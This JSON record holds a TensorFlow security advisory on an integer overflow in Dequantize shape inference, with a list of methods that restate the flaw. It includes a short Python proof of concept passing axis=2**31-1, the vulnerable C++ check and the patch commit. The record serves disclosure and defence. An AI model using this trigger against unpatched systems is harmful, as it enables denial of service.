{"description": "### Impact \nThe [implementation of shape inference for `Dequantize`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/ops/array_ops.cc#L3001-L3034) is vulnerable to an integer overflow weakness:\n\n```python\nimport tensorflow as tf\n\ninput = tf.constant([1,1],dtype=tf.qint32)\n\n@tf.function\ndef test():\n  y = tf.raw_ops.Dequantize(\n    input=input,\n    min_range=[1.0],\n    max_range=[10.0],\n    mode='MIN_COMBINED',\n    narrow_range=False,\n    axis=2**31-1,\n    dtype=tf.bfloat16)\n  return y\n\ntest()\n``` \n\nThe `axis` argument can be `-1` (the default value for the optional argument) or any other positive value at most the number of dimensions of the input. Unfortunately, the upper bound is not checked, and, since the code computes `axis + 1`, an attacker can trigger an integer overflow:\n\n```cc\n  int axis = -1; \n  Status s = c->GetAttr(\"axis\", &axis);\n  // ...\n  if (axis < -1) {\n    return errors::InvalidArgument(\"axis should be at least -1, got \",\n                                   axis);\n  }\n  // ...\n  if (axis != -1) {\n    ShapeHandle input;\n    TF_RETURN_IF_ERROR(c->WithRankAtLeast(c->input(0), axis + 1, &input));\n    // ...\n  }\n```\n  \n### Patches\nWe have patched the issue in GitHub commit [b64638ec5ccaa77b7c1eb90958e3d85ce381f91b](https://github.com/tensorflow/tensorflow/commit/b64638ec5ccaa77b7c1eb90958e3d85ce381f91b).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n      \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team.", "methods": ["Integer overflow in TensorFlow implementation of shape inference for Dequantize.", "Unchecked bounds in code, allowing for integer overflow.", "Lack of input validation for the `axis` argument in `Dequantize` function.", "Use of unchecked bounds in code to trigger integer overflow."]}
